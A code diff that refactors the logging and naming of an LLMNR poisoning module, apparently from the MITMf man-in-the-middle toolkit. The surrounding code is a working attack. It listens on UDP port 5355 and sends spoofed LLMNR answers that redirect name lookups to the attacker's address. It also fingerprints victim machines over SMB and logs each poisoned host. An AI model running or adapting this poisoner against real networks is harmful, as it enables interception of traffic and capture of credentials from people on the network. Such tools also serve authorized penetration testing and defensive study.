@@ -1,34 +1,34 @@
-#! /usr/bin/env python2.7
-
 import socket
 import threading
 import struct
 import logging
 
 from SocketServer import UDPServer, ThreadingMixIn, BaseRequestHandler
+from core.logger import logger
 from core.configwatcher import ConfigWatcher
 from core.responder.fingerprinter.Fingerprint import RunSmbFinger
 from core.responder.packet import Packet
 from core.responder.odict import OrderedDict
 from core.responder.common import *
 
-mitmf_logger = logging.getLogger("mitmf")
+formatter = logging.Formatter("%(asctime)s [LLMNRpoisoner] %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
+log = logger().setup_logger("LLMNRpoisoner", formatter)
 
-class LLMNRPoisoner:
+class LLMNRpoisoner:
 
 	def start(self, options, ourip):
 
-		global args; args = options #For now a quick hack to make argparse's namespace object available to all
+		global args; args = options #For now a quick way to make argparse's namespace object available to all
 		global OURIP ; OURIP = ourip  #and our ip address
 
 		try:
-			mitmf_logger.debug("[LLMNRPoisoner] OURIP => {}".format(OURIP))
+			log.debug("OURIP => {}".format(OURIP))
 			server = ThreadingUDPLLMNRServer(("0.0.0.0", 5355), LLMNR)
-			t = threading.Thread(name="LLMNRPoisoner", target=server.serve_forever) #LLMNR
+			t = threading.Thread(name="LLMNRpoisoner", target=server.serve_forever) #LLMNR
 			t.setDaemon(True)
 			t.start()
-		except Exception, e:
-			mitmf_logger.error("[LLMNRPoisoner] Error starting on port 5355: {}:".format(e))
+		except Exception as e:
+			log.error("Error starting on port 5355: {}:".format(e))
 
 class ThreadingUDPLLMNRServer(ThreadingMixIn, UDPServer):
 
@@ -82,7 +82,7 @@ class LLMNR(BaseRequestHandler):
 
 	def handle(self):
 
-		ResponderConfig   = ConfigWatcher.getInstance().getConfig()['Responder']
+		ResponderConfig   = ConfigWatcher().config['Responder']
 		DontRespondTo     = ResponderConfig['DontRespondTo']
 		DontRespondToName = ResponderConfig['DontRespondToName']
 		RespondTo         = ResponderConfig['RespondTo']
@@ -97,11 +97,11 @@ class LLMNR(BaseRequestHandler):
 						if args.finger:
 							try:
 								Finger = RunSmbFinger((self.client_address[0],445))
-								mitmf_logger.warning("[LLMNRPoisoner] {} is looking for: {} | OS: {} | Client Version: {}".format(self.client_address[0], Name,Finger[0],Finger[1]))
+								log.warning("{} is looking for: {} | OS: {} | Client Version: {}".format(self.client_address[0], Name,Finger[0],Finger[1]))
 							except Exception:
-								mitmf_logger.warning("[LLMNRPoisoner] {} is looking for: {}".format(self.client_address[0], Name))
+								log.warning("{} is looking for: {}".format(self.client_address[0], Name))
 						else:
-							mitmf_logger.warning("[LLMNRPoisoner] {} is looking for: {}".format(self.client_address[0], Name))
+							log.warning("{} is looking for: {}".format(self.client_address[0], Name))
 
 					if DontRespondToSpecificHost(DontRespondTo):
 						if RespondToIPScope(DontRespondTo, self.client_address[0]):
@@ -118,13 +118,13 @@ class LLMNR(BaseRequestHandler):
 									buff.calculate()
 									for x in range(1):
 										soc.sendto(str(buff), self.client_address)
-										mitmf_logger.warning("[LLMNRPoisoner] Poisoned answer sent to {} the requested name was: {}".format(self.client_address[0],Name))
+										log.warning("Poisoned answer sent to {} the requested name was: {}".format(self.client_address[0],Name))
 										if args.finger:
 											try:
 												Finger = RunSmbFinger((self.client_address[0],445))
-												mitmf_logger.info('[LLMNRPoisoner] OS: {} | ClientVersion: {}'.format(Finger[0], Finger[1]))
+												log.info('OS: {} | ClientVersion: {}'.format(Finger[0], Finger[1]))
 											except Exception:
-												mitmf_logger.info('[LLMNRPoisoner] Fingerprint failed for host: {}'.format(self.client_address[0]))
+												log.info('Fingerprint failed for host: {}'.format(self.client_address[0]))
 												pass
 
 								if RespondToSpecificName(RespondToName) and RespondToNameScope(RespondToName.upper(), Name.upper()):
@@ -132,13 +132,13 @@ class LLMNR(BaseRequestHandler):
 									buff.calculate()
 									for x in range(1):
 										soc.sendto(str(buff), self.client_address)
-										mitmf_logger.warning("[LLMNRPoisoner] Poisoned answer sent to {} the requested name was: {}".format(self.client_address[0],Name))
+										log.warning("[LLMNRPoisoner] Poisoned answer sent to {} the requested name was: {}".format(self.client_address[0],Name))
 										if args.finger:
 											try:
 												Finger = RunSmbFinger((self.client_address[0],445))
-												mitmf_logger.info('[LLMNRPoisoner] OS: {} | ClientVersion: {}'.format(Finger[0], Finger[1]))
+												log.info('OS: {} | ClientVersion: {}'.format(Finger[0], Finger[1]))
 											except Exception:
-												mitmf_logger.info('[LLMNRPoisoner] Fingerprint failed for host: {}'.format(self.client_address[0]))
+												log.info('Fingerprint failed for host: {}'.format(self.client_address[0]))
 												pass
 
 					if args.analyze == False and RespondToSpecificHost(RespondTo) == False:
@@ -147,26 +147,26 @@ class LLMNR(BaseRequestHandler):
 							buff.calculate()
 							for x in range(1):
 								soc.sendto(str(buff), self.client_address)
-							mitmf_logger.warning("[LLMNRPoisoner] Poisoned answer sent to {} the requested name was: {}".format(self.client_address[0], Name))
+							log.warning("Poisoned answer sent to {} the requested name was: {}".format(self.client_address[0], Name))
 							if args.finger:
 								try:
 									Finger = RunSmbFinger((self.client_address[0],445))
-									mitmf_logger.info('[LLMNRPoisoner] OS: {} | ClientVersion: {}'.format(Finger[0], Finger[1]))
+									log.info('OS: {} | ClientVersion: {}'.format(Finger[0], Finger[1]))
 								except Exception:
-									mitmf_logger.info('[LLMNRPoisoner] Fingerprint failed for host: {}'.format(self.client_address[0]))
+									log.info('Fingerprint failed for host: {}'.format(self.client_address[0]))
 									pass
 						if RespondToSpecificName(RespondToName) == False:
 							 buff = LLMNRAns(Tid=data[0:2],QuestionName=Name, AnswerName=Name)
 							 buff.calculate() 
 							 for x in range(1):
 								 soc.sendto(str(buff), self.client_address)
-							 mitmf_logger.warning("[LLMNRPoisoner] Poisoned answer sent to {} the requested name was: {}".format(self.client_address[0], Name))
+							 log.warning("Poisoned answer sent to {} the requested name was: {}".format(self.client_address[0], Name))
 							 if args.finger:
 								 try:
 									 Finger = RunSmbFinger((self.client_address[0],445))
-									 mitmf_logger.info('[LLMNRPoisoner] OS: {} | ClientVersion: {}'.format(Finger[0], Finger[1]))
+									 log.info('OS: {} | ClientVersion: {}'.format(Finger[0], Finger[1]))
 								 except Exception:
-									 mitmf_logger.info('[LLMNRPoisoner] Fingerprint failed for host: {}'.format(self.client_address[0]))
+									 log.info('Fingerprint failed for host: {}'.format(self.client_address[0]))
 									 pass
 						else:
 							pass
